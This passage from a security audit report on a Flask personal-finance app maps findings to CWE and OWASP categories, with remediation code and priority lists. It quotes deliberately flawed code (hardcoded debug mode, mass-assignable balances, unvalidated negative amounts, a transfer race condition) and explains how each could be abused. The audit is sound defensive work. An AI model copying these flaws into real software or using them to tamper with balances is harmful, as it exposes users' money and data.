**Impact:** All scheduler startup errors are silently swallowed. If a scheduler job fails to register, recurring transactions and budget alerts will not run, with no error indication.

**Remediation:**
- Catch only the specific exception (`SchedulerAlreadyRunningError`)
- Log the exception for debugging

---

### Finding MISC-03: No Security Headers Beyond Talisman Defaults

- **Severity:** Low
- **CWE:** CWE-693 (Protection Mechanism Failure)
- **OWASP:** A05:2021 -- Security Misconfiguration
- **Affected File:** `app/__init__.py:61-64`

**Impact:** While Talisman adds basic headers in production, there is no explicit configuration for:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy`

**Remediation:**
- Configure Talisman with explicit security headers in production:

```python
talisman.init_app(
    app,
    force_https=True,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self'",
        'style-src': "'self' 'unsafe-inline'",
    },
    referrer_policy='strict-origin-when-cross-origin',
)
```

---

### Finding CFG-08: Debug Mode Hardcoded in run.py with All-Interface Binding

- **Severity:** Critical
- **CWE:** CWE-489 (Active Debug Code)
- **OWASP:** A05:2021 -- Security Misconfiguration
- **Affected File:** `run.py:11-12`

```python
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

**Impact:** `debug=True` is hardcoded, overriding the config-based `DEBUG = False` in ProductionConfig. Combined with `host='0.0.0.0'`, the Werkzeug interactive debugger is accessible from any network interface. The Werkzeug debugger allows **arbitrary Python code execution** -- this is a full remote code execution (RCE) vulnerability.

**Remediation:**
- Remove the hardcoded `debug=True` and derive from config:

```python
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

- Never bind to `0.0.0.0` in development; use `127.0.0.1`
- Add a startup warning if debug mode is enabled

---

### Finding MISC-04: Account Number Field Stored Without Encryption

- **Severity:** High
- **CWE:** CWE-312 (Cleartext Storage of Sensitive Information)
- **OWASP:** A04:2021 -- Insecure Design
- **Affected File:** `app/models/account.py:15`

```python
account_number = db.Column(db.String(50), nullable=True)  # encrypted
```

**Impact:** The comment says "encrypted" but the column stores plaintext strings. Bank account numbers are highly sensitive PII. The `to_dict()` method does not expose `account_number`, but it is readable from the database file directly (SQLite).

**Remediation:**
- Encrypt account numbers at rest using `cryptography.fernet` (already in requirements.txt)
- Implement field-level encryption with a per-user key derived from the application secret

---

## Summary Table

| ID | Finding | Severity | CWE | OWASP |
|---|---|---|---|---|
| AUTH-01 | JWT in localStorage (XSS token theft) | Critical | CWE-922 | A02 |
| AUTH-02 | No JWT revocation (logout no-op) | Critical | CWE-613 | A07 |
| AUTH-03 | No account lockout | High | CWE-307 | A07 |
| AUTH-04 | 24-hour JWT expiration | Medium | CWE-613 | A07 |
| AUTH-05 | No rate limit on password change | Medium | CWE-307 | A07 |
| AUTH-06 | Email enumeration | Medium | CWE-203 | A07 |
| AUTH-07 | Weak password policy | Low | CWE-521 | A07 |
| CFG-01 | Hardcoded production credentials in .env | Critical | CWE-798 | A05 |
| CFG-02 | Weak fallback secret keys | Critical | CWE-798 | A05 |
| CFG-03 | No CORS policy | High | CWE-942 | A05 |
| CFG-04 | CSP disabled in non-production | High | CWE-693 | A05 |
| CFG-05 | In-memory rate limit storage | Medium | CWE-799 | A05 |
| CFG-06 | Backup exposes full database | High | CWE-862 | A01 |
| CFG-07 | Swagger UI in all environments | Medium | CWE-200 | A05 |
| CFG-08 | Debug mode hardcoded in run.py (RCE) | Critical | CWE-489 | A05 |
| XSS-01 | Stored XSS via innerHTML (15 templates) | Critical | CWE-79 | A03 |
| XSS-02 | Search term reflected without sanitization | Medium | CWE-79 | A03 |
| FILE-01 | CSV injection in exports | Critical | CWE-1236 | A03 |
| FILE-02 | Backup path traversal | High | CWE-22 | A01 |
| FILE-03 | No MIME type validation on backup download | Medium | CWE-434 | A04 |
| LOG-01 | Missing audit trail for financial operations | High | CWE-778 | A09 |
| LOG-02 | Sensitive data in audit details field | Medium | CWE-532 | A09 |
| LOG-03 | Exception details in email error logs | Low | CWE-209 | A09 |
| DEP-01 | Flask-Mail unmaintained | Medium | CWE-1104 | A06 |
| DEP-02 | bcrypt unused | Low | CWE-328 | A02 |
| DEP-03 | No dependency vulnerability scanning | Medium | CWE-1104 | A06 |
| MISC-01 | Demo user with hardcoded password | Medium | CWE-798 | A07 |
| MISC-02 | Silent exception swallowing | Low | CWE-390 | A09 |
| MISC-03 | Missing explicit security headers | Low | CWE-693 | A05 |
| MISC-04 | Account numbers stored in plaintext | High | CWE-312 | A04 |

---

## Priority Remediation Order

### Immediate (This Week)
1. **CFG-08:** Fix `run.py` -- remove hardcoded `debug=True`, bind to `127.0.0.1`
2. **CFG-01:** Rotate Brevo credentials, move secrets to environment variables
3. **CFG-02:** Remove fallback secret keys, fail fast on missing config
4. **XSS-01:** Add `escapeHtml()` utility and apply to ALL 15 templates using innerHTML
5. **FILE-01:** Add CSV field sanitization in `reports.py` and `export_service.py`
6. **AUTH-02:** Implement JWT revocation (token blacklist)
7. **AUTH-01:** Move JWT to HTTPOnly cookies

### Short-Term (This Sprint)
8. **CFG-06:** Restrict backup endpoint to admin users
9. **AUTH-03:** Implement account lockout mechanism
10. **CFG-03:** Add Flask-CORS with restricted origins
11. **CFG-04:** Enable CSP in all environments with strict policy
12. **FILE-02:** Add path validation to `restore_backup()`
13. **LOG-01:** Add audit logging to all financial CRUD operations
14. **AUTH-04:** Reduce JWT expiration to 15-30 minutes

### Medium-Term (Next Sprint)
15. **AUTH-05:** Add rate limiting to password change
16. **AUTH-06:** Fix email enumeration
17. **CFG-05:** Switch to Redis for rate limiting
18. **DEP-01:** Replace Flask-Mail with Flask-Mailman
19. **MISC-01:** Remove demo user from production seeds
20. **CFG-07:** Disable Swagger in production
21. **LOG-02:** Sanitize audit details field, restrict access

---

## 6. API SECURITY -- IDOR, Mass Assignment, Authorization

### Finding API-01: Account Balance Directly Settable via Update (Mass Assignment)

- **Severity:** Critical
- **CWE:** CWE-915 (Mass Assignment / Overly Permissive Modification)
- **OWASP:** A01:2021 -- Broken Access Control
- **Affected File:** `app/api/accounts.py:169-170`

```python
if 'balance' in data:
    account.balance = float(data['balance'])
```

**Impact:** The `PUT /api/v1/accounts/<id>` endpoint allows any authenticated user to directly set their account balance to an arbitrary value. This bypasses all financial integrity logic -- no transaction record is created, no audit trail exists, and no validation against expenses/income is performed. A user can set balance to `9999999999.99`.

**Remediation:**
- Remove `balance` from the allowed update fields entirely.
- Balance must only change through: expense creation, income creation, transfers, goal contributions/withdrawals, and savings pot operations.
- If a reconciliation feature is needed, create a dedicated `/reconcile` endpoint with mandatory audit logging and reason field.

---

### Finding API-02: Expense/Income Update Allows Negative Amounts

- **Severity:** Critical
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A03:2021 -- Injection

**Affected Files:**
- `app/api/expenses.py:265-266`
- `app/api/income.py:252-253`

```python
# expenses.py line 265-266
if 'amount' in data:
    expense.amount = float(data['amount'])  # No validation!

# income.py line 252-253
if 'amount' in data:
    income.amount = float(data['amount'])  # No validation!
```

**Impact:** While `create_expense` and `create_income` validate `amount > 0`, the `update_expense` and `update_income` endpoints perform NO validation on the new amount. Setting amount to `-5000`:
- For expenses: adds money to the account (credit instead of debit)
- For income: deducts money from the account (debit instead of credit)

This allows arbitrary account balance manipulation through the update flow.

**Remediation:**
```python
if 'amount' in data:
    new_amount = float(data['amount'])
    if new_amount <= 0:
        return jsonify({'success': False, 'error': {'code': 'VALIDATION_ERROR', 'message': 'Amount must be positive'}}), 400
    expense.amount = new_amount
```

---

### Finding API-03: Goal Contribution `type` Field User-Injectable

- **Severity:** High
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/api/goals.py:282`

```python
contribution = GoalContribution(
    goal_id=goal.id,
    user_id=current_user.id,
    account_id=account_id,
    amount=amount,
    type=data.get('type', 'manual'),  # User-controlled!
    date=...,
    notes=data.get('notes'),
)
```

**Impact:** The expected values are `manual`, `auto`, and `withdrawal`. A malicious user can set `type='withdrawal'` on a contribution record. When the goal is deleted, the `delete_goal` endpoint (lines 205-212) iterates contributions and inverts the refund logic based on type:
```python
if contrib.type == 'withdrawal':
    account.balance -= Decimal(str(contrib.amount))  # Re-deducts!
else:
    account.balance += Decimal(str(contrib.amount))  # Refunds
```
A contribution marked as `withdrawal` would be re-deducted instead of refunded on goal deletion, causing double-counting of funds.

**Remediation:**
- Whitelist allowed types for the contribute endpoint:
```python
VALID_CONTRIB_TYPES = {'manual', 'auto'}
contrib_type = data.get('type', 'manual')
if contrib_type not in VALID_CONTRIB_TYPES:
    return jsonify({'error': 'Invalid contribution type'}), 400
```

---

### Finding API-04: Account Type Not Validated Against Whitelist

- **Severity:** High
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/api/accounts.py:76-88`

```python
account = Account(
    user_id=current_user.id,
    name=name,
    type=account_type,  # No validation
    ...
)
```

**Impact:** The documentation specifies valid types as `[cash, bank, credit_card, upi, wallet, investment]` but no server-side enforcement exists. Invalid types break frontend rendering, reports, filters, and any logic that depends on type values.

**Remediation:**
```python
VALID_ACCOUNT_TYPES = {'cash', 'bank', 'credit_card', 'upi', 'wallet', 'investment'}
if account_type not in VALID_ACCOUNT_TYPES:
    return jsonify({'success': False, 'error': {'code': 'VALIDATION_ERROR', 'message': 'Invalid account type'}}), 400
```

---

### Finding API-05: Payment Method and Frequency Not Validated

- **Severity:** Medium
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected Files:**
- `app/api/expenses.py:165` -- `payment_method` not validated
- `app/api/income.py:158` -- `payment_method` not validated
- `app/api/recurring.py:104,108-109` -- `type`, `frequency`, `payment_method` not validated
- `app/api/goals.py:83` -- `priority` not validated
- `app/api/budgets.py:121-122` -- `amount` and `period` not validated

**Impact:** Free-form strings are accepted for enum-like fields. This leads to data inconsistency, broken filtering, and potential logic errors.

**Remediation:**
- Validate all enum fields against whitelists at the API layer.
- Add CHECK constraints at the database level for critical fields.

---

### Finding API-06: LIKE Wildcard Injection in Search

- **Severity:** Medium
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **OWASP:** A03:2021 -- Injection

**Affected Files:**
- `app/api/expenses.py:81-84`
- `app/api/income.py:75-78`

```python
if search:
    query = query.filter(
        (Expense.merchant.ilike(f'%{search}%')) |
        (Expense.notes.ilike(f'%{search}%'))
    )
```

**Impact:** While SQLAlchemy parameterizes the query (no SQL injection), the `%` and `_` LIKE wildcards are not escaped. A search for `%` matches all records. No length limit on search input enables potential resource exhaustion.

**Remediation:**
```python
def escape_like(s):
    return s.replace('\\', '\\\\').replace('%', '\\%').replace('_', '\\_')

search = escape_like(search[:100])  # Also limit length
```

---

### Finding API-07: Pagination `per_page` Not Bounded (DoS)

- **Severity:** Medium
- **CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
- **OWASP:** A04:2021 -- Insecure Design

**Affected Files:**
- `app/api/expenses.py:61`
- `app/api/income.py:58`
- `app/api/notifications.py:37`

```python
per_page = request.args.get('per_page', 20, type=int)
```

**Impact:** No upper bound. A request with `?per_page=9999999` loads all records into memory, causing potential OOM or response timeout.

**Remediation:**
```python
per_page = min(request.args.get('per_page', 20, type=int), 100)
```

---

### Finding API-08: No Rate Limiting on Financial Mutation Endpoints

- **Severity:** High
- **CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
- **OWASP:** A04:2021 -- Insecure Design

**Affected:** All API endpoints except `auth.py`

**Impact:** Rate limiting is only on authentication endpoints (register: 5/min, login: 10/min). All financial mutation endpoints use the default 200/hour. With a stolen or compromised token, an attacker can:
- Create thousands of fake transactions per hour
- Rapidly attempt transfers to exploit race conditions
- Flood the system with budget/goal/pot entries

**Remediation:**
- Add `@limiter.limit("30 per minute")` to all POST/PUT/DELETE endpoints
- Consider per-user rate limiting using a custom key function

---

## 7. FINANCIAL BUSINESS LOGIC

### Finding BIZ-01: Race Condition in Account Transfers (TOCTOU)

- **Severity:** Critical
- **CWE:** CWE-362 (Concurrent Execution Using Shared Resource with Improper Synchronization)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/api/accounts.py:258-269`

```python
from_account = Account.query.get_or_404(from_id)         # Read
to_account = Account.query.get_or_404(to_id)

if from_account.balance < Decimal(str(amount)):            # Check
    return jsonify(...), 400

from_account.balance -= Decimal(str(amount))               # Use
to_account.balance += Decimal(str(amount))
db.session.commit()
```

**Impact:** Two concurrent transfer requests from the same source account can both pass the balance check before either commits. This allows overdraft -- money is created from nothing. With SQLite (table-level locking) this is harder to exploit, but with PostgreSQL or MySQL in production, this is a direct money creation vulnerability.

**Remediation:**
- Use `SELECT ... FOR UPDATE` (pessimistic locking):
```python
from_account = Account.query.filter_by(id=from_id).with_for_update().first()
```
- Add a database-level CHECK constraint: `balance >= 0`
- Wrap the entire transfer in a single serializable transaction

---

### Finding BIZ-02: Float Precision Errors Cause Money Creation/Destruction

- **Severity:** Critical
- **CWE:** CWE-682 (Incorrect Calculation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected Files:**
- `app/api/accounts.py:84` -- `balance=float(data.get('balance', 0))`
- `app/api/expenses.py:161` -- `amount=float(amount)`
- `app/api/income.py:154` -- `amount=float(amount)`
- `app/api/goals.py:80` -- `target_amount=float(data.get('target_amount', 0))`
- `app/api/budgets.py:121` -- `amount=float(data.get('amount', 0))`
- `app/api/recurring.py:106` -- `amount=float(data.get('amount', 0))`

```python
expense = Expense(
    user_id=current_user.id,
    amount=float(amount),   # <-- float precision loss
    ...
)
```

**Impact:** Amounts are stored as Python `float` before being written to `Numeric(12, 2)` database columns. Float arithmetic introduces rounding errors (`0.1 + 0.2 != 0.3`). Over thousands of transactions, this causes phantom money creation or destruction. The `Decimal` import exists in many files but is only used for balance adjustments, not for the transaction amounts themselves.

**Remediation:**
- Convert ALL monetary values to `Decimal` at input parsing:
```python
from decimal import Decimal
amount = Decimal(str(data.get('amount', '0')))
```
- Never use `float()` for any monetary field.

---

### Finding BIZ-03: Goal/Savings Pot Withdrawal Without Account Creates Phantom Money

- **Severity:** High
- **CWE:** CWE-682 (Incorrect Calculation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected Files:**
- `app/api/goals.py:343-359`
- `app/api/savings_pots.py:302-319`

```python
# goals.py withdrawal
if account_id:          # Only adds to account if account_id provided
    account = Account.query.get(account_id)
    account.balance += Decimal(str(amount))

contribution = GoalContribution(...)  # But goal amount is ALWAYS deducted
goal.current_amount -= Decimal(str(amount))
```

**Impact:** When withdrawing from a goal or savings pot WITHOUT specifying an `account_id`, the amount is deducted from the goal/pot balance but never added anywhere. The money simply vanishes from the system. The `delete_goal` endpoint then refunds ALL contributions (including those "lost" withdrawals), potentially re-creating money.

**Remediation:**
- Require `account_id` for all withdrawals
- Or track unallocated withdrawals explicitly
- Or warn the user that withdrawal without an account will permanently remove the funds

---

### Finding BIZ-04: Savings Pot Delete Does Not Zero Out Balance After Refund

- **Severity:** Medium
- **CWE:** CWE-682 (Incorrect Calculation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/api/savings_pots.py:177-185`

```python
if account_id and pot.balance > 0:
    account = Account.query.get(account_id)
    if account and account.user_id == current_user.id:
        account.balance += Decimal(str(pot.balance))

pot.is_active = False  # Balance is NOT zeroed out
db.session.commit()
```

**Impact:** The pot's balance field retains its value after refund. If the pot is later reactivated (e.g., via direct DB manipulation or a future "restore" feature), the balance becomes phantom money that was already refunded.

**Remediation:**
```python
pot.balance = 0  # Add this line
pot.is_active = False
db.session.commit()
```

---

### Finding BIZ-05: Budget Amount Can Be Zero (Division by Zero)

- **Severity:** Medium
- **CWE:** CWE-369 (Divide By Zero)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/api/budgets.py:118-129`, `app/api/budgets.py:34-35`

```python
# Creation -- no validation
budget = Budget(
    amount=float(data.get('amount', 0)),  # Can be 0
    ...
)

# Utilization calculation
budget_amount = float(budget.amount)
utilization = (float(spent) / budget_amount * 100) if budget_amount > 0 else 0
```

**Impact:** While the utilization calculation handles `budget_amount == 0`, creating a zero-amount budget is nonsensical. Negative budget amounts would produce negative utilization percentages.

**Remediation:**
- Validate `amount > 0` in create and update endpoints.

---

### Finding BIZ-06: Goal `target_amount` Can Be Zero or Negative

- **Severity:** Medium
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/api/goals.py:76-86`

```python
goal = Goal(
    target_amount=float(data.get('target_amount', 0)),  # No validation
    ...
)
```

**Impact:** A goal with `target_amount=0` makes `progress_percent` always 0. A negative `target_amount` would produce negative progress percentages and break the `is_completed` logic (line 289: `if goal.current_amount >= goal.target_amount`).

**Remediation:**
- Validate `target_amount > 0` in create and update endpoints.

---

### Finding BIZ-07: Expense/Income Create Silently Accepts Invalid `account_id`

- **Severity:** Medium
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/api/expenses.py:172-175`, `app/api/income.py:164-167`

```python
if expense.account_id:
    account = Account.query.get(expense.account_id)
    if account and account.user_id == current_user.id:
        account.balance -= Decimal(str(expense.amount))
```

**Impact:** If `account_id` points to a non-existent account or another user's account, the balance adjustment is silently skipped. The expense/income record is still created, but the account balance is not updated. This creates a discrepancy between recorded transactions and actual balances.

**Remediation:**
```python
if expense.account_id:
    account = Account.query.get(expense.account_id)
    if not account or account.user_id != current_user.id:
        return jsonify({'error': 'Invalid account'}), 400
    account.balance -= Decimal(str(expense.amount))
```

---

## 8. DATABASE SECURITY

### Finding DB-01: No Database-Level Constraints on Financial Amounts

- **Severity:** High
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected Models:**
- `app/models/expense.py:10` -- `amount = db.Column(db.Numeric(12, 2), nullable=False)` -- no CHECK constraint
- `app/models/income.py:10` -- same
- `app/models/goal.py:12-13` -- `target_amount` and `current_amount` -- no CHECK constraints
- `app/models/budget.py:11` -- `amount` -- no CHECK constraint
- `app/models/account.py:12` -- `balance` -- no CHECK constraint (can go negative)

**Impact:** If the API validation is bypassed (direct DB access, migration scripts, future code changes), negative or zero amounts can be stored. The database should be the last line of defense.

**Remediation:**
```python
amount = db.Column(db.Numeric(12, 2), nullable=False)
__table_args__ = (
    db.CheckConstraint('amount > 0', name='ck_expense_positive_amount'),
)

# For account balance:
balance = db.Column(db.Numeric(12, 2), default=0)
__table_args__ = (
    db.CheckConstraint('balance >= 0', name='ck_account_non_negative_balance'),
)
```

---

### Finding DB-02: Cascade Delete Not Configured on User Model

- **Severity:** Medium
- **CWE:** CWE-404 (Improper Resource Shutdown or Release)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/models/user.py:24-34`

```python
expenses = db.relationship('Expense', backref='user', lazy='dynamic')
incomes = db.relationship('Income', backref='user', lazy='dynamic')
budgets = db.relationship('Budget', backref='user', lazy='dynamic')
goals = db.relationship('Goal', backref='user', lazy='dynamic')
savings_pots = db.relationship('SavingsPot', backref='user', lazy='dynamic')
accounts = db.relationship('Account', backref='user', lazy='dynamic')
```

**Impact:** If a User record is deleted, all related records (expenses, income, accounts, etc.) become orphaned with dangling `user_id` foreign keys. This causes data integrity issues and potential errors in queries.

**Remediation:**
- Add `cascade='all, delete-orphan'` to relationships, or
- Add `ON DELETE CASCADE` to foreign key constraints, or
- Implement soft delete instead of hard delete

---

### Finding DB-03: OTP Token Stores Password Hash in Separate Table

- **Severity:** High
- **CWE:** CWE-256 (Unprotected Storage of Credentials)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/models/otp_token.py:13`

```python
password_hash = db.Column(db.String(255), nullable=True)  # stored for registration
```

**Impact:** The OTP token table stores the user's password hash during the registration flow. If OTP token records are not properly cleaned up after verification, password hashes persist in a secondary table. Combined with database backup exposure (CFG-06) or SQL injection, this leaks credentials.

**Remediation:**
- Delete OTP token records immediately after successful verification.
- Add a scheduled cleanup job that deletes expired OTP tokens (e.g., every hour).
- Consider storing only a nonce or reference, not the actual hash.

---

### Finding DB-04: Account Number Field Comment Says "encrypted" But No Encryption Exists

- **Severity:** High
- **CWE:** CWE-311 (Missing Encryption of Sensitive Data)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/models/account.py:15`

```python
account_number = db.Column(db.String(50), nullable=True)  # encrypted
```

**Impact:** The comment says "encrypted" but no encryption logic is implemented anywhere in the codebase. Bank account numbers are highly sensitive PII. While `to_dict()` does not expose this field, it is readable from the SQLite database file directly.

**Remediation:**
- Implement field-level encryption using `cryptography.fernet`:
```python
from cryptography.fernet import Fernet
# Derive per-user key from app secret + user ID
# Encrypt on write, decrypt on read
```
- Or remove the field if not needed.

---

## 9. INPUT VALIDATION

### Finding VAL-01: No Upper Bound on Monetary Amounts

- **Severity:** Medium
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A04:2021 -- Insecure Design

**Affected File:** `app/utils/validators.py:23-29`

```python
def validate_amount(amount):
    try:
        val = float(amount)
        return val > 0
    except (ValueError, TypeError):
        return False
```

**Impact:** No upper bound. A user can submit an expense of `999999999999.99`, which exceeds the `Numeric(12, 2)` column capacity (max `9999999999.99`). This causes a database error or silent truncation.

**Remediation:**
```python
from decimal import Decimal, InvalidOperation
MAX_AMOUNT = Decimal('9999999999.99')

def validate_amount(amount):
    try:
        val = Decimal(str(amount))
        return val > 0 and val <= MAX_AMOUNT
    except (InvalidOperation, ValueError, TypeError):
        return False
```

---

### Finding VAL-02: Email Validation Regex Accepts Edge Cases

- **Severity:** Low
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A03:2021 -- Injection

**Affected File:** `app/utils/validators.py:4-7`

```python
def validate_email(email):
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))
```

**Impact:** Accepts emails like `user@localhost` (no TLD restriction), domains with consecutive dots (`user@..com`), and extremely long addresses. No length validation.

**Remediation:**
- Add length check: `if len(email) > 254: return False`
- Use a library like `email-validator` for robust validation
- Or tighten the regex to require a valid TLD

---

### Finding VAL-03: Password Policy Missing Special Character Requirement

- **Severity:** Medium
- **CWE:** CWE-521 (Weak Password Requirements)
- **OWASP:** A07:2021 -- Identification and Authentication Failures

**Affected File:** `app/utils/validators.py:10-19`

```python
def validate_password_strength(password):
    if len(password) < 8:
        return False, 'Password must be at least 8 characters long'
    if not re.search(r'[A-Z]', password):
        return False, 'Password must contain at least one uppercase letter'
    if not re.search(r'[a-z]', password):
        return False, 'Password must contain at least one lowercase letter'
    if not re.search(r'\d', password):
        return False, 'Password must contain at least one digit'
    return True, 'Password is strong'
```

**Impact:** No special character requirement. No maximum length check (potential DoS with extremely long passwords). `Password1` passes all checks. For a financial application, this is insufficient.

**Remediation:**
- Add special character requirement: `re.search(r'[!@#$%^&*(),.?":{}|<>]', password)`
- Add maximum length: `if len(password) > 128: return False`
- Consider checking against common password lists

---

### Finding VAL-04: Amount Validation Not Used Consistently

- **Severity:** Medium
- **CWE:** CWE-20 (Improper Input Validation)
- **OWASP:** A03:2021 -- Injection

**Affected:** Most API endpoints validate amounts inline rather than using the `validate_amount` utility function, leading to inconsistent validation logic.

**Remediation:**
- Use `validate_amount()` from `app/utils/validators.py` in all endpoints that accept amounts.
- Centralize all validation logic to prevent drift.

---

## 10. UPDATED SUMMARY TABLE (New Findings)

| ID | Finding | Severity | CWE | OWASP |
|---|---|---|---|---|
| API-01 | Account balance directly settable (mass assignment) | Critical | CWE-915 | A01 |
| API-02 | Expense/income update allows negative amounts | Critical | CWE-20 | A03 |
| API-03 | Goal contribution type field injectable | High | CWE-20 | A04 |
| API-04 | Account type not validated against whitelist | High | CWE-20 | A04 |
| API-05 | Payment method and frequency not validated | Medium | CWE-20 | A04 |
| API-06 | LIKE wildcard injection in search | Medium | CWE-89 | A03 |
| API-07 | Pagination per_page not bounded | Medium | CWE-770 | A04 |
| API-08 | No rate limiting on mutation endpoints | High | CWE-770 | A04 |
| BIZ-01 | Race condition in account transfers | Critical | CWE-362 | A04 |
| BIZ-02 | Float precision errors cause money creation | Critical | CWE-682 | A04 |
| BIZ-03 | Withdrawal without account creates phantom money | High | CWE-682 | A04 |
| BIZ-04 | Pot delete does not zero balance after refund | Medium | CWE-682 | A04 |
| BIZ-05 | Budget amount can be zero (division by zero) | Medium | CWE-369 | A04 |
| BIZ-06 | Goal target_amount can be zero or negative | Medium | CWE-20 | A04 |
| BIZ-07 | Silent acceptance of invalid account_id | Medium | CWE-20 | A04 |
| DB-01 | No DB-level constraints on financial amounts | High | CWE-20 | A04 |
| DB-02 | Cascade delete not configured on User model | Medium | CWE-404 | A04 |
| DB-03 | OTP token stores password hash separately | High | CWE-256 | A04 |
| DB-04 | Account number "encrypted" comment misleading | High | CWE-311 | A04 |
| VAL-01 | No upper bound on monetary amounts | Medium | CWE-20 | A04 |
| VAL-02 | Email validation edge cases | Low | CWE-20 | A03 |
| VAL-03 | Weak password policy (no special chars) | Medium | CWE-521 | A07 |
| VAL-04 | Amount validation not used consistently | Medium | CWE-20 | A03 |

---

## CONSOLIDATED PRIORITY REMEDIATION ORDER

### Immediate -- Critical (Fix This Week)
1. **BIZ-02:** Convert all `float(amount)` to `Decimal(str(amount))` across all API files
2. **CFG-08 / CFG-02:** Fix `run.py` debug mode and remove fallback secret keys
3. **CFG-01:** Rotate Brevo credentials, move secrets out of `.env`
4. **API-01:** Remove `balance` from `update_account` allowed fields
5. **API-02:** Add `amount > 0` validation to `update_expense` and `update_income`
6. **BIZ-01:** Add `SELECT ... FOR UPDATE` to transfer endpoint
7. **XSS-01:** Replace all `innerHTML` with `textContent` or DOMPurify
8. **AUTH-01/AUTH-02:** Move JWT to HTTPOnly cookies, implement token revocation

### High Priority (Fix This Sprint)
9. **API-03:** Whitelist goal contribution types
10. **API-04:** Validate account types against whitelist
11. **API-08:** Add rate limiting to all mutation endpoints
12. **BIZ-03:** Require `account_id` for withdrawals
13. **DB-01:** Add CHECK constraints on financial columns
14. **DB-03:** Clean up OTP tokens after verification
15. **DB-04:** Encrypt account numbers or remove the field
16. **CFG-06:** Restrict backup endpoint

### Medium Priority (Fix Next Sprint)
17. **API-05:** Validate all enum fields (payment_method, frequency, priority)
18. **API-06:** Escape LIKE wildcards in search
19. **API-07:** Bound pagination `per_page` to max 100
20. **BIZ-04:** Zero out pot balance on delete
21. **BIZ-05/BIZ-06:** Validate budget and goal amounts > 0
22. **BIZ-07:** Validate account_id exists and belongs to user
23. **VAL-01:** Add upper bound to amount validation
24. **VAL-03:** Strengthen password policy
25. **DB-02:** Add cascade delete to User relationships

### Low Priority (Next Sprint)
26. **VAL-02:** Tighten email validation regex
27. **API-05:** Add DB-level CHECK constraints for enum fields
28. **VAL-04:** Centralize amount validation usage

---

## Final Verdict

### Production Ready: ❌ NOT READY

**Immediate Fixes Required (8 items):**
1. Fix `run.py` - remove `debug=True`, bind to `127.0.0.1`
2. Rotate all exposed credentials (Brevo SMTP, secret keys)
3. Remove fallback secret keys from `app/config.py`
4. Add `escapeHtml()` to all 15 templates using innerHTML
5. Add CSV field sanitization to prevent formula injection
6. Remove `balance` from account update endpoint
7. Add `amount > 0` validation to expense/income updates
8. Convert all `float()` to `Decimal()` for monetary values

### Secure Deployment Checklist

- [ ] All Critical findings remediated
- [ ] All High findings remediated
- [ ] JWT moved to HTTPOnly cookies
- [ ] Token revocation implemented
- [ ] Account lockout after failed logins
- [ ] CORS configured with allowed origins
- [ ] CSP enabled with strict policy
- [ ] Rate limiting on all mutation endpoints
- [ ] Audit logging for all financial operations
- [ ] Database CHECK constraints on amounts
- [ ] Backup endpoint restricted to admin
- [ ] Swagger UI disabled in production
- [ ] All credentials rotated and externalized
- [ ] Security headers configured (HSTS, X-Frame-Options, etc.)
- [ ] Dependency vulnerability scan passed

---

## Testing Approach Used

- **Static Code Analysis (SAST):** Manual review of all Python, JavaScript, and HTML files
- **Dynamic Testing Logic Review:** Analysis of API endpoint behavior and data flow
- **Manual Code Audit:** Line-by-line review of authentication, authorization, and financial logic
- **Threat Modeling:** Identification of attack vectors based on OWASP Top 10 and API Top 10
- **Secure Architecture Review:** Assessment of Flask configuration, deployment settings, and security controls

---

*End of Security Audit Report*
